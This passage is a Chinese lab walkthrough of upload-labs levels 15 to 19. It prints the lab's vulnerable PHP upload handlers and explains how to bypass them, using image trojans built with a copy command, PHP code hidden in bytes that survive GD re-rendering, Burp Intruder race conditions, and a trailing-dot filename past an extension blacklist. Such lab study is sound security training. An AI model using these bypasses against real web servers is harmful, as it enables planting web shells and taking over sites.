<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    &#x2F;&#x2F;需要开启php_exif模块</span><br><span class="line">    $image_type &#x3D; exif_imagetype($filename);</span><br><span class="line">    switch ($image_type) &#123;</span><br><span class="line">        case IMAGETYPE_GIF:</span><br><span class="line">            return &quot;gif&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_JPEG:</span><br><span class="line">            return &quot;jpg&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_PNG:</span><br><span class="line">            return &quot;png&quot;;</span><br><span class="line">            break;    </span><br><span class="line">        default:</span><br><span class="line">            return false;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">    $res &#x3D; isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg &#x3D; &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="和上一关一样"><a href="#和上一关一样" class="headerlink" title="和上一关一样"></a>和上一关一样</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407222258037.png" alt="image-20200407222258037"></p>
<h4 id="upload-labs第十六关"><a href="#upload-labs第十六关" class="headerlink" title="upload-labs第十六关"></a>upload-labs第十六关</h4><h5 id="查看提示-2"><a href="#查看提示-2" class="headerlink" title="查看提示"></a>查看提示</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408081053635.png" alt="image-20200408081053635"></p>
<h5 id="代码分析-13"><a href="#代码分析-13" class="headerlink" title="代码分析"></a>代码分析</h5><p>程序通过imagecreatefromjpeg()函数调用了PHP的GD库(GD库，是php处理图形的扩展库)，对图片进行了转换。</p>
<p>将一个正常显示的图片，上传到服务器。下载被渲染后与原始图片对比，在仍然相同的数据块部分插入WebShell代码，进行上传。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    &#x2F;&#x2F; 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">    $filetype &#x3D; $_FILES[&#39;upload_file&#39;][&#39;type&#39;];</span><br><span class="line">    $tmpname &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line"></span><br><span class="line">    $target_path&#x3D;$UPLOAD_ADDR.basename($filename);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 获得上传文件的扩展名</span><br><span class="line">    $fileext&#x3D; substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext &#x3D;&#x3D; &quot;jpg&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;使用上传的图片生成新的图片</span><br><span class="line">            $im &#x3D; imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im &#x3D;&#x3D; false)&#123;</span><br><span class="line">                $msg &#x3D; &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                &#x2F;&#x2F;给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename &#x3D; strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagejpeg($im,$newimagepath);</span><br><span class="line">                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext &#x3D;&#x3D; &quot;png&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;使用上传的图片生成新的图片</span><br><span class="line">            $im &#x3D; imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im &#x3D;&#x3D; false)&#123;</span><br><span class="line">                $msg &#x3D; &quot;该文件不是png格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 &#x2F;&#x2F;给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename &#x3D; strval(rand()).&quot;.png&quot;;</span><br><span class="line">                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagepng($im,$newimagepath);</span><br><span class="line">                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload &#x3D; true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext &#x3D;&#x3D; &quot;gif&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;使用上传的图片生成新的图片</span><br><span class="line">            $im &#x3D; imagecreatefromgif($target_path);</span><br><span class="line">            if($im &#x3D;&#x3D; false)&#123;</span><br><span class="line">                $msg &#x3D; &quot;该文件不是gif格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                &#x2F;&#x2F;给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename &#x3D; strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagegif($im,$newimagepath);</span><br><span class="line">                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="上传流程"><a href="#上传流程" class="headerlink" title="上传流程"></a>上传流程</h5><p>准备一张GIF图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408085942785.png" alt="image-20200408085942785"></p>
<p>先上传查看能否上传，成功上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408090025138.png" alt="image-20200408090025138"></p>
<p>在命令行使用<code>copy picture/d+ shell.php 2.gif</code>来复制一张带有木马的图片，在进行上传</p>
<p>页面返回成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408090025138.png" alt="image-20200408090025138"></p>
<p>打开二次渲染后的图片发现我们插入的<code>&lt;?php  phpinfo(); ?&gt;</code>消失了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408090541467.png" alt="image-20200408090541467"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408090556017.png" alt="image-20200408090556017"></p>
<p>显然，这样的图片马上传方式失败了。<br> 不过二次渲染会保留一些文件内容不会改变，所以在制作图片马之前，我们先观察二次渲染前后图片不会改变的地方，将其代码写入其中即可绕过二次渲染</p>
<p>经过对比，蓝色区域是不会改变的，在其中写入了<code>&lt;?php phpinfo(); ?&gt;</code>保存，再次进行上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408090816482.png" alt="image-20200408090816482"></p>
<p>页面返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408090859802.png" alt="image-20200408090859802"></p>
<p>打开图片查看是否有phpinfo()代码，查看是否被二次渲染掉，上传成功，并没有被渲染掉</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408091006941.png" alt="image-20200408091006941"></p>
<p>不知这一种方法，还有就是自己写一个小代码，里面包含简易提交和一句话木马，将写入的代码二次渲染到图片上去，这样上传后可以直接在页面中查看是否返回成功</p>
<p>在页面中查看是否能返回phpinfo的页面，成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408091502290.png" alt="image-20200408091502290"></p>
<h4 id="upload-labs第十七关"><a href="#upload-labs第十七关" class="headerlink" title="upload-labs第十七关"></a>upload-labs第十七关</h4><h5 id="查看提示-3"><a href="#查看提示-3" class="headerlink" title="查看提示"></a>查看提示</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408091704597.png" alt="image-20200408091704597"></p>
<h5 id="代码分析-14"><a href="#代码分析-14" class="headerlink" title="代码分析"></a>代码分析</h5><p>代码审计，使用了<code>unlink()</code>函数删除文件。</p>
<p>这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">    $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">    $upload_file &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             </span><br><span class="line">             </span><br><span class="line">             unlink($upload_file);</span><br><span class="line">             </span><br><span class="line">             </span><br><span class="line">             $is_upload &#x3D; true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg &#x3D; &#39;上传失败！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建一个php文本文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408092257532.png" alt="image-20200408092257532"></p>
<p>上传使用burp抓包发送的intruder模块进行clear$</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408092529967.png" alt="image-20200408092529967"></p>
<p>修改User-Agent将其Add$</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408092612457.png" alt="image-20200408092612457"></p>
<p>设置payloads选择Number，执行次数1000次</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408092657212.png" alt="image-20200408092657212"></p>
<p>点击start attack进行攻击</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408092758617.png" alt="image-20200408092758617"></p>
<p>攻击是在页面输入你之前上传的php文件名字，不断进行刷新</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408093537018.png" alt="image-20200408093537018"></p>
<h4 id="upload-labs第十八关"><a href="#upload-labs第十八关" class="headerlink" title="upload-labs第十八关"></a>upload-labs第十八关</h4><h5 id="查看提示-4"><a href="#查看提示-4" class="headerlink" title="查看提示"></a>查看提示</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408093707249.png" alt="image-20200408093707249"></p>
<h5 id="代码分析-15"><a href="#代码分析-15" class="headerlink" title="代码分析"></a>代码分析</h5><p>对文件后缀名做了白名单判断，然后检查文件大小、文件是否存在等等。 将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;index.php</span><br><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    require_once(&quot;.&#x2F;myupload.php&quot;);</span><br><span class="line">    $imgFileName &#x3D;time();</span><br><span class="line">    $u &#x3D; new MyUpload($_FILES[&#39;upload_file&#39;][&#39;name&#39;], $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $_FILES[&#39;upload_file&#39;][&#39;size&#39;],$imgFileName);</span><br><span class="line">    $status_code &#x3D; $u-&gt;upload($UPLOAD_ADDR);</span><br><span class="line">    switch ($status_code) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">            $img_path &#x3D; $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            $msg &#x3D; &#39;文件已经被上传，但没有重命名。&#39;;</span><br><span class="line">            break; </span><br><span class="line">        case -1:</span><br><span class="line">            $msg &#x3D; &#39;这个文件不能上传到服务器的临时文件存储目录。&#39;;</span><br><span class="line">            break; </span><br><span class="line">        case -2:</span><br><span class="line">            $msg &#x3D; &#39;上传失败，上传目录不可写。&#39;;</span><br><span class="line">            break; </span><br><span class="line">        case -3:</span><br><span class="line">            $msg &#x3D; &#39;上传失败，无法上传该类型文件。&#39;;</span><br><span class="line">            break; </span><br><span class="line">        case -4:</span><br><span class="line">            $msg &#x3D; &#39;上传失败，上传的文件过大。&#39;;</span><br><span class="line">            break; </span><br><span class="line">        case -5:</span><br><span class="line">            $msg &#x3D; &#39;上传失败，服务器已经存在相同名称文件。&#39;;</span><br><span class="line">            break; </span><br><span class="line">        case -6:</span><br><span class="line">            $msg &#x3D; &#39;文件无法上传，文件不能复制到目标目录。&#39;;</span><br><span class="line">            break;      </span><br><span class="line">        default:</span><br><span class="line">            $msg &#x3D; &#39;未知错误！&#39;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;myupload.php</span><br><span class="line">class MyUpload&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  var $cls_arr_ext_accepted &#x3D; array(</span><br><span class="line">      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,</span><br><span class="line">      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  &#x2F;** upload()</span><br><span class="line">   **</span><br><span class="line">   ** Method to upload the file.</span><br><span class="line">   ** This is the only method to call outside the class.</span><br><span class="line">   ** @para String name of directory we upload to</span><br><span class="line">   ** @returns void</span><br><span class="line">  **&#x2F;</span><br><span class="line">  function upload( $dir )&#123;</span><br><span class="line">    </span><br><span class="line">    $ret &#x3D; $this-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret &#x3D; $this-&gt;setDir( $dir );</span><br><span class="line">    if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret &#x3D; $this-&gt;checkExtension();</span><br><span class="line">    if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret &#x3D; $this-&gt;checkSize();</span><br><span class="line">    if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; if flag to check if the file exists is set to 1</span><br><span class="line">    </span><br><span class="line">    if( $this-&gt;cls_file_exists &#x3D;&#x3D; 1 )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret &#x3D; $this-&gt;checkFileExists();</span><br><span class="line">      if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; if we are here, we are ready to move the file to destination</span><br><span class="line"></span><br><span class="line">    $ret &#x3D; $this-&gt;move();</span><br><span class="line">    if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; check if we need to rename the file</span><br><span class="line"></span><br><span class="line">    if( $this-&gt;cls_rename_file &#x3D;&#x3D; 1 )&#123;</span><br><span class="line">      $ret &#x3D; $this-&gt;renameFile();</span><br><span class="line">      if( $ret !&#x3D; 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; if we are here, everything worked as planned :)</span><br><span class="line"></span><br><span class="line">    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>页面代码显示补全在www目录下查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408094417117.png" alt="image-20200408094417117"></p>
<p>因此也存在条件竞争的问题，不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408100032030.png" alt="image-20200408100032030"></p>
<h4 id="upload-labs第十九关"><a href="#upload-labs第十九关" class="headerlink" title="upload-labs第十九关"></a>upload-labs第十九关</h4><h5 id="查看提示-5"><a href="#查看提示-5" class="headerlink" title="查看提示"></a>查看提示</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408100802057.png" alt="image-20200408100802057"></p>
<h5 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h5><p>黑名单策略，文件名用户可控，文件命名<code>upload-19.php.</code>绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name &#x3D; $_POST[&#39;save_name&#39;];</span><br><span class="line">        $file_ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $img_path)) &#123; </span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $msg &#x3D; &#39;上传失败！&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg &#x3D; &#39;禁止保存为该类型文件！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>选择one.jpg这个可上传的文件，在保存名称处改为php文件名，不能直接改为one.php因为php是不可上传的文件，以上代码使用黑名单但是没有过滤” . “点等，所以利用Windows的特性直接在文件名后面加上一个” . “点，返回空白图片，复制图片地址</p>
<p>当然不止这一种情况，可以不使用“ . ”直接使用空格也是可以的，因为使用了黑名单但是没有过滤，所以有很多绕过绕过情况</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408101223834.png" alt="image-20200408101223834"></p>
<p>在新的页面打开并查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408101414864.png" alt="image-20200408101414864"></p>
]]></content>
  </entry>
</search>
